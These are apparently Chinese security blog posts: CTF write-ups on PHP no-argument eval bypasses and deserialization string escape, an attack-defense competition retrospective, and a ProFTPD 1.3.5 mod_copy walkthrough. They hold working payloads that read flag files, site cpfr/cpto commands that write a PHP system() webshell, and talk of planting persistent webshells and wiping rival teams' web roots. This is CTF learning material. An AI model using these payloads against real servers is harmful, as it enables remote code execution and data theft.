еҮҪж•°е°ҶеҶ…йғЁжҢҮй’ҲжҢҮеҗ‘ж•°з»„дёӯзҡ„дёӢдёҖдёӘе…ғзҙ пјҢе№¶иҫ“еҮә file() : иҜ»еҸ–дёҖдёӘж–Үд»¶пјҢиҝ”еӣһзҡ„ж•°з»„дёӯе…ғзҙ еҜ№еә”жҜҸдёҖиЎҢзҡ„еҶ…е®№ readfile() : иҜ»еҸ–дёҖдёӘж–Үд»¶ sqrt() : иҝ”еӣһдёҖдёӘж•°еӯ—зҡ„е№іж–№ж № tan() : иҝ”еӣһдёҖдёӘж•°еӯ—зҡ„жӯЈеҲҮеј§еәҰеҖј atan() : иҝ”еӣһдёҖдёӘж•°еӯ—зҡ„еҸҚжӯЈеҲҮеј§еәҰеҖј cosh() : иҝ”еӣһдёҖдёӘж•°еӯ—зҡ„еҸҢжӣІдҪҷејҰ sinh() : иҝ”еӣһдёҖдёӘж•°еӯ—зҡ„еҸҢжӣІжӯЈејҰ ceil() : иҝ”еӣһеҗ‘дёҠеҸ–ж•ҙ floor() : иҝ”еӣһеҗ‘дёӢеҸ–ж•ҙ round() пјҡ иҝ”еӣһеӣӣиҲҚдә”е…ҘеҸ–ж•ҙ chr() : иҝ”еӣһжҢҮе®ҡASCIIеҖјзҡ„еӯ—з¬Ұ ord() : иҝ”еӣһеӯ—з¬ҰдёІдёӯз¬¬дёҖдёӘеӯ—з¬Ұ ASCIIеҖј chdir() : ж”№еҸҳеҪ“еүҚзҡ„зӣ®еҪ• localtime(timestamp,is_assoc) : еҸ–еҫ—жң¬ең°ж—¶й—ҙпјҢж•°з»„зҡ„з¬¬дёҖдёӘе…ғзҙ дёәз§’ time() : еҜ№еә”localtime()зҡ„timestamp phpversion() : иҝ”еӣһphpзүҲжң¬еҸ· crypt() : дҪҝз”ЁзӣҗеҖјз”ҹжҲҗHash hebrevc() : еҸҚеҗ‘жҳҫзӨәеёҢдјҜжқҘеӯ—з¬Ұ strrev() : еҸҚиҪ¬еӯ—з¬ҰдёІ file() : жҠҠж•ҙдёӘж–Үд»¶иҜ»е…ҘдёҖдёӘж•°з»„дёӯ array_reverse() : иҝ”еӣһзҝ»иҪ¬йЎәеәҸзҡ„ж•°з»„ array_flip() : еҸҚиҪ¬/дәӨжҚўж•°з»„дёӯзҡ„й”®еҗҚе’ҢеҜ№еә”е…іиҒ”зҡ„й”®еҖј array_rand() : иҝ”еӣһдёҖдёӘеҢ…еҗ«йҡҸжңәй”®еҗҚзҡ„ж•°з»„ з”ҹжҲҗ . зҡ„еӣӣдёӘжҖқи·Ҝ strrev(crypt()) з”ҹжҲҗHashпјҢе№¶е°ҶжңҖеҗҺдёҖдҪҚзҡ„.йҖҶеәҸеҲ°з¬¬дёҖдҪҚпјҢеҸҜд»ҘдҪҝз”Ёserialize(array())жҲ–phpversion()дҪңдёәеҶ…еөҢеҮҪж•° localeconv() йҖүеҸ–з¬¬дёҖдёӘе…ғзҙ  ж•°еӯҰеҮҪж•°еҘ—еЁғFuzz localtime(time()) з¬¬46з§’ [GXYCTF2019]зҰҒжӯўеҘ—еЁғ 12345678910111213141516171819202122232425<?phpinclude "flag.php";echo "flagеңЁе“ӘйҮҢе‘ўпјҹ<br>";if(isset($_GET['exp'])){ if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) { if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) { if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) { // echo $_GET['exp']; @eval($_GET['exp']); } else{ die("иҝҳе·®дёҖзӮ№е“ҰпјҒ"); } } else{ die("еҶҚеҘҪеҘҪжғіжғіпјҒ"); } } else{ die("иҝҳжғіиҜ»flagпјҢиҮӯејҹејҹпјҒ"); }}// highlight_file(__FILE__);?> дё”еҪ“еүҚзӣ®еҪ•зҡ„ж–Үд»¶еҰӮдёӢ array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(4) ".git" [3]=> string(8) "flag.php" [4]=> string(9) "index.php" } дёҚиғҪжҺ§еҲ¶ж•°з»„жҢҮй’ҲзӣҙжҺҘжҢҮеҗ‘flag.phpпјҢеҸӘиғҪиҝӣиЎҢйҡҸжңәиҜ»еҸ– Payload0 1var_dump(readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion()))))))))); еҲҶжһҗ phpversion() #з”ЁдәҺиҫ“еҮәphpеҪ“еүҚзүҲжң¬дҝЎжҒҜ crypt(phpversion()) #еҠ еҜҶдҝЎжҒҜпјҢжңҖеҗҺдёҖдҪҚжңүеҸҜиғҪдёә. strrev(crypt(phpversion())) #еӯ—з¬ҰдёІйҖҶеәҸпјҢе°Ҷ.з§»еҠЁиҮіз¬¬дёҖдҪҚ ord(strrev(crypt(phpversion()))) #еҸ–з¬¬дёҖдҪҚзҡ„ASCIIз ҒеҖј chr(ord(strrev(crypt(phpversion())))) #иҪ¬дёәеӯ—з¬ҰпјҢй…ҚеҗҲдёҠдёҖжӯҘеҸҜд»ҘиҠӮйҖүеҮәз¬¬дёҖдҪҚзҡ„. scandir(chr(ord(strrev(crypt(phpversion()))))) #жү«жҸҸеҪ“еүҚзӣ®еҪ• array_flip(scandir(chr(ord(strrev(crypt(phpversion())))))) #е°Ҷжү«жҸҸз»“жһңж•°з»„дәӨжҚўй”®еҗҚдёҺй”®еҖј array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion()))))))) #йҡҸжңәйҖүеҸ–ж•°з»„й”®еҗҚпјҢеҚійҡҸжңәйҖүеҸ–ж–Үд»¶еҗҚ readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion())))))))) #иҜ»еҸ–ж–Үд»¶ var_dump(readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion()))))))))) #иҫ“еҮәиҜ»еҸ–ж–Үд»¶з»“жһң Payload1 1var_dump(readfile(array_rand(array_flip(scandir(pos(localeconv())))))); еҲҶжһҗ localeconv() #з”ҹжҲҗж•°з»„пјҢз¬¬дёҖдёӘе…ғзҙ дёә. pos(localeconv()) #еҸ–з¬¬дёҖдёӘе…ғзҙ пјҢеҚі. scandir(pos(localeconv())) #жү«жҸҸеҪ“еүҚзӣ®еҪ• array_flip(scandir(pos(localeconv()))) #е°Ҷжү«жҸҸз»“жһңж•°з»„дәӨжҚўй”®еҗҚдёҺй”®еҖј array_rand(array_flip(scandir(pos(localeconv())))) #йҡҸжңәйҖүеҸ–ж•°з»„й”®еҗҚпјҢеҚійҡҸжңәйҖүеҸ–ж–Үд»¶еҗҚ readfile(array_rand(array_flip(scandir(pos(localeconv()))))) #иҜ»еҸ–ж–Үд»¶ var_dump(readfile(array_rand(array_flip(scandir(pos(localeconv())))))) #иҫ“еҮәиҜ»еҸ–ж–Үд»¶з»“жһң Payload2 1var_dump(readfile(array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))))))); еҲҶжһҗ phpversion() #иҫ“еҮәphpеҪ“еүҚзүҲжң¬ ceil(cosh(cosh(tan(ceil(atan(phpversion())))))) #дҪҝз”Ёж•°еӯҰеҮҪж•°и®Ўз®—еҫ—еҮә46 chr(ceil(sinh(cosh(tan(ceil(atan(phpversion()))))))) #е°Ҷ46иҪ¬дёә. scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))) #жү«жҸҸеҪ“еүҚзӣ®еҪ• array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))))) #йҡҸжңәйҖүеҸ–ж•°з»„й”®еҗҚпјҢеҚійҡҸжңәйҖүеҸ–ж–Үд»¶еҗҚ readfile(array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion()))))))))))) #иҜ»еҸ–ж–Үд»¶ var_dump(readfile(array_rand(array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion())))))))))))) #иҫ“еҮәиҜ»еҸ–ж–Үд»¶з»“жһң Fuzzи„ҡжң¬ 1234567891011121314151617<?php$func = array('sqrt', 'tan', 'sinh', 'cosh', 'atan', 'ceil', 'floor', 'cos', 'sin');array_flip(scandir(chr(ceil(sinh(cosh(tan(ceil(atan(phpversion()))))))))) #е°Ҷжү«жҸҸз»“жһңж•°з»„дәӨжҚўй”®еҗҚдёҺй”®еҖјforeach($func as $a){foreach($func as $b){foreach($func as $c){foreach($func as $d){foreach($func as $e){foreach($func as $f){foreach($func as $g){foreach($func as $h){if($a($b($c($d($e($f($g("5.6.40"))))))) === 46){ echo "$a($b($c($d($e($f($g())))))))\n";}}}}}}}}}?> [ByteCTF2019]Boring_Code иҠӮйҖүйғЁеҲҶд»Јз Ғ 1234567891011121314<?php$code = $_GET["code"];if (';' === preg_replace('/[a-z]+\((?R)?\)/', NULL, $code)){ if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) { echo 'bye~'; } else { eval($code); }}?> flagдёәдёҠеұӮзӣ®еҪ•зҡ„жңҖеҗҺдёҖдёӘж–Үд»¶ Payload0 1echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))); еҲҶжһҗ localeconv() #з”ҹжҲҗж•°з»„пјҢз¬¬дёҖдёӘе…ғзҙ дёә. pos(localeconv()) #еҸ–з¬¬дёҖдёӘе…ғзҙ пјҢеҚі. scandir(pos(localeconv())) #жү«жҸҸеҪ“еүҚзӣ®еҪ• next(scandir(pos(localeconv()))) #йҖүеҸ–е…ғзҙ .. chdir(next(scandir(pos(localeconv())))) #иҝӣе…ҘдёҠзә§зӣ®еҪ• time(chdir(next(scandir(pos(localeconv()))))) #з”ҹжҲҗж—¶й—ҙжҲіпјҢphp7.4зүҲжң¬дёӯж— жі•иҝӣиЎҢеҶ…еөҢеҮҪж•° localtime(time(chdir(next(scandir(pos(localeconv())))))) #е°Ҷж—¶й—ҙжҲіиҪ¬дёәж•°з»„еҪўејҸзҡ„жң¬ең°ж—¶й—ҙ pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))) #йҖүеҸ–з¬¬дёҖдёӘе…ғзҙ пјҢеҚіз§’ chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))) #иҪ¬дёәASCIIеӯ—з¬ҰпјҢ46з§’ж—¶жү§иЎҢеҸҜд»Ҙеҫ—еҲ°. scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))) #жү«жҸҸеҪ“еүҚзӣ®еҪ• end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))) #йҖүеҸ–жңҖеҗҺдёҖдёӘж–Үд»¶пјҢеҚіflagж–Үд»¶ readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))) #иҜ»еҸ–flagж–Үд»¶ echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))) #иҫ“еҮәиҜ»еҸ–flagж–Үд»¶зҡ„еҶ…е®№ Payload1 1if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array()))))))))echo(readfile(end(scandir(strrev(crypt(serialize(array())))))))); еҲҶжһҗ ifиҜӯеҸҘз”ЁдәҺиҝ”еӣһдёҠдёҖзә§пјҢдё”chdirзҡ„иҝ”еӣһз»“жһңдёә1пјҢжҺ§еҲ¶ifиҜӯеҸҘжү§иЎҢд№ӢеҗҺзҡ„з”ЁдәҺиҜ»еҸ–flagзҡ„еөҢеҘ—еҮҪж•° [з¬¬дә”еұҠдёҠжө·еёӮеӨ§еӯҰз”ҹзҪ‘з»ңе®үе…ЁеӨ§иөӣ]Decade 1234567891011121314151617<?phphighlight_file(__FILE__);$code = $_GET['code'];if (!empty($code)) { if (';' === preg_replace('/[a-z]+\((?R)?\)/', NULL, $code)) { if (preg_match('/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) { echo 'bye~'; } else { eval($code); } } else { echo "No way!!!"; }}else { echo "No way!!!"; } иҝҷйҮҢз®ҖеҚ•еҶҷдёҖдёӢиҜ»еҸ–ж–Үд»¶зҡ„жҖқи·Ҝ з”ұдәҺreadfileиў«BanпјҢжүҖд»ҘйңҖиҰҒдҪҝз”Ёfile()жқҘиҝӣиЎҢж–Үд»¶иҜ»еҸ– иҮідәҺflagзҡ„иҫ“еҮәпјҢеҸҜд»ҘдҪҝз”Ёserialize()иҝӣиЎҢеәҸеҲ—еҢ–пјҢjoin()жқҘи®Іж•°з»„иҪ¬дёәеӯ—з¬ҰдёІпјҢжҲ–иҖ…з”Ёnext()жҢҮеҗ‘flag

posts.title: жіүе·һеёӮзҪ‘з»ңе®үе…Ёж”»йҳІжҜ”иөӣзәҝдёӢиөӣеӨҚзӣҳ
posts.text: AWDе°Ҹз»“&еҸҚжҖқ Attack зҗҶжғіеҢ–зҡ„ж”»еҮ»жөҒзЁӢеә”иҜҘдёә Dзӣҫжү«жҸҸй»ҳи®ӨеҗҺй—Ё -> зј–еҶҷPYи„ҡжң¬иҝӣиЎҢжү№йҮҸз§ҚжӨҚдёҚжӯ»й©¬ -> дёҚжӯ»й©¬з»ҙжҢҒжқғйҷҗжҢҒз»ӯGetflag дҪҶжҳҜеҪ“ж—¶еҸӘжҳҜеңЁз”ЁPYи„ҡжң¬еҲ©з”Ёй»ҳи®ӨеҗҺй—ЁеҺ»жү№йҮҸGetflag иҝҷе°ұеҜјиҮҙдәҶеҗҺжңҹеҗҺй—Ёиў«дҝ®еӨҚзҡ„жғ…еҶөдёӢпјҢдёҚиғҪдёҺеүҚйқўзҡ„йҳҹдјҚзј©е°Ҹе·®и·қ иҖҢеҪ“ж—¶зҡ„webжқғйҷҗз»ҷеҫ—еҫҲеӨ§пјҢеҸҜд»ҘеҲ жҺү /var/www/html дёӢзҡ„еҶ…е®№ еҰӮжһңеҪ“ж—¶жңүдҪҝз”ЁдёҚжӯ»й©¬пјҢйӮЈе°ұеҸҜд»ҘиҝӣиЎҢеҲ йҷӨж“ҚдҪңпјҢйҳ»жӯўе…¶д»–йҳҹдјҚеҫ—еҲҶ еҗҢж—¶еҲ©з”ЁдёҚжӯ»й©¬жқҘGetflagпјҢиҝҷж ·е°ұеҸҜд»Ҙиҝ…йҖҹзј©е°Ҹе·®и·қ еҰӮжһңжҳҜжҜ”иөӣж°ҙеҮҶзЁҚеҫ®й«ҳдёҖдәӣзҡ„иҜқпјҢеә”иҜҘдёҚдјҡеҮәзҺ°иҝҷз§ҚwebжқғйҷҗиҝҮеӨ§зҡ„жғ…еҶө йӮЈд№ҲеҸҜд»Ҙе°қиҜ•дҪҝз”ЁдёҚжӯ»й©¬жқҘеё®еҠ©еҲ«дәәPatchжҺүе·ІзҹҘеҗҺй—Ё Defend Webжәҗз Ғзҡ„еӨҮд»ҪдёҺж•°жҚ®еә“зҡ„еӨҮд»Ҫе’ҢиҝҳеҺҹиҮӘз„¶ж— йңҖеӨҡиЁҖ дё»иҰҒжҳҜж—Ҙеҝ—е®Ўи®Ўд»ҘеҸҠжөҒйҮҸжҚ•иҺ· йҖҡиҝҮиҝҷдёӨиҖ…жқҘеҚҸеҠ©иҮӘе·ұеҲҶжһҗжңҚеҠЎеҷЁдёҠд»ҚеӯҳеңЁзҡ„жјҸжҙһ жҲ–иҖ…жҳҜеңЁжҹҗдёӘзӣ®еҪ•дёӢеӯҳеңЁдёҚжӯ»й©¬ е…¶ж¬ЎпјҢеҲҶжһҗдёҚжӯ»й©¬жөҒйҮҸд№ӢеҗҺд№ҹеҸҜд»Ҙе°қиҜ•йҮҚж”ҫжқҘеҖҹеҲ«дәәзҡ„дёҚжӯ»й©¬Getflag дёҖиҲ¬Hashй©¬зҡ„еҜҶз ҒйғҪжҳҜдёҖж ·зҡ„пјҢеҸҜд»Ҙе°қиҜ•дёҖжіўд№ҢйёҰеқҗйЈһжңә дҪҶжҳҜеҪ“ж—¶иІҢдјјжІЎжңүжқғйҷҗеҺ»зӣ‘еҗ¬зҪ‘еҚЎпјҢеҫҲзәій—·

posts.text: ProFTPD 1.3.5 mod_copy RCE иҜҘжјҸжҙһзҡ„жҸҸиҝ°еҰӮдёӢ 12The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.ProFTPD 1.3.5дёӯзҡ„mod_copyжЁЎеқ—е…Ғи®ёиҝңзЁӢе…ҘдҫөиҖ…йҖҡиҝҮsite cpfrе’Ңsite cptoе‘Ҫд»ӨиҝӣиЎҢд»»ж„Ҹж–Үд»¶иҜ»еҶҷ еҹәдәҺд»»ж„Ҹж–Үд»¶иҜ»еҶҷзҡ„ж“ҚдҪңпјҢеҸҜд»Ҙе°Ҷзӣ®ж ҮжңәеҷЁдёҠзҡ„дёҖдәӣж•Ҹж„ҹдҝЎжҒҜж–Үд»¶жӢ·иҙқиҮіеҸҜи®ҝй—®и·Ҝеҫ„(WEBи·Ҝеҫ„/SMBи·Ҝеҫ„/etc.)жқҘиҝӣиЎҢиҜ»еҸ– з”ҡиҮіеҸҜд»ҘиҝӣиЎҢеҶҷе…ҘWebShellзҡ„ж“ҚдҪңпјҢж“ҚдҪңеҰӮдёӢ 1234site cpfr /proc/self/cmdlinesite cpto /var/www/html/<?php system($_GET["cmd"]);?>.phpsite cpfr /var/www/html/<?php system($_GET["cmd"]);?>.phpsite cpto /var/www/html/evil.php /proc/[pid]/cmdline /proc/[pid]/cmdline This read-only file holds the complete command line for theprocess, unless the process is a zombie. иҝӣзЁӢеңЁжү§иЎҢе‘Ҫд»Өд№ӢеүҚдјҡд»ҺиҜҘж–Үд»¶иҺ·еҸ–е‘Ҫд»ӨпјҢжүҖд»ҘftpиҝӣзЁӢеңЁжү§иЎҢ site cpto /var/www/html/<?php system($_GET["cmd"]);?>.php ж—¶ /proc/self/cmdline дёӯзҡ„еҶ…е®№е·Із»ҸеҸҳжҲҗдәҶ 10.100.120.31:57420: SITE cpto /var/www/html/<?php system($_GET["cmd"]);?>.php еҚіжӢ·иҙқиҝҷж®өеҶ…е®№иҮі /var/www/html/<?php system($_GET["cmd"]);?>.php еҗҺйқўдёӨжқЎе‘Ҫд»Өзҡ„ж“ҚдҪңеҚідёәдҝ®ж”№ж–Үд»¶еҗҚ еҚіеҸҜд»ҘдҪҝз”ЁиҜҘжјҸжҙһжқҘиҝӣиЎҢWebShellзҡ„еҶҷе…Ҙж“ҚдҪң

posts.title: PHPеҸҚеәҸеҲ—еҢ–еӯ—з¬ҰдёІйҖғйҖё
posts.text: PHPеҸҚеәҸеҲ—еҢ–еӯ—з¬ҰдёІйҖғйҖёе°Ҹз»“ 101 жӯЈеёёзҡ„еәҸеҲ—еҢ–еӯ—з¬ҰдёІиҝӣиЎҢеҸҚеәҸеҲ—еҢ– 12345678910echo var_dump(unserialize('O:4:"test":3:{s:2:"id";s:1:"1";s:4:"user";s:5:"admin";s:4:"pass";s:5:"admin";}'));object(test)#2 (3) { ["id"]=> string(1) "1" ["user"]=> string(5) "admin" ["pass"]=> string(5) "admin"} йқһжӯЈеёё 12345678910echo var_dump(unserialize('O:4:"test":3:{s:2:"id";s:1:"1";s:4:"user";s:5:"admin";s:4:"pass";s:6:"hacked";}";s:4:"pass";s:5:"admin";}'));object(test)#2 (3) { ["id"]=> string(1) "1" ["user"]=> string(5) "admin" ["pass"]=> string(6) "hacked"} иҝҷйҮҢжҲ‘д»¬жҠҠз”ЁжҲ·еҗҚеӨ„зҡ„ж•°жҚ®ж”№дёә admin";s:4:"pass";s:6:"hacked";} иҖҢд№ӢеҗҺзҡ„ ";s:4:"pass";s:5:"admin";} еҲҷдјҡиў«еҝҪз•Ҙ [0CTF 2016]piapiapia 12345678910#update.phpif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10) die('Invalid nickname');move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));$profile['phone'] = $_POST['phone'];$profile['email'] = $_POST['email'];$profile['nickname'] = $_POST['nickname'];$profile['photo'] = 'upload/' . md5($file['name']);$user->update_profile($username, serialize($profile)); еңЁжҳҫзӨәдҝЎжҒҜж—¶пјҢ $profile['photo'] дёәиҜ»еҸ–зҡ„ж–Үд»¶ жӯӨйўҳжҖқи·ҜеҚідёәе°ҶиҜҘеҸӮж•°зҡ„еҶ…е®№ж”№дёәеӯҳжңүflagзҡ„ж–Үд»¶ 123456789101112131415161718#class.phppublic function show_profile($username) { $username = parent::filter($username); $where = "username = '$username'"; $object = parent::select($this->table, $where); return $object->profile;}public function filter($string) { $escape = array('\'', '\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string);} еӯҳе…ҘдҝЎжҒҜж—¶пјҢеӯҳеңЁеӯ—з¬ҰжӣҝжҚўпјҢе…¶дёӯ"where" -> "hacker"еӯҳеңЁеӯ—з¬ҰдёІй•ҝеәҰеҸҳй•ҝзҡ„й—®йўҳ 12345678#config.php<?php $config['hostname']
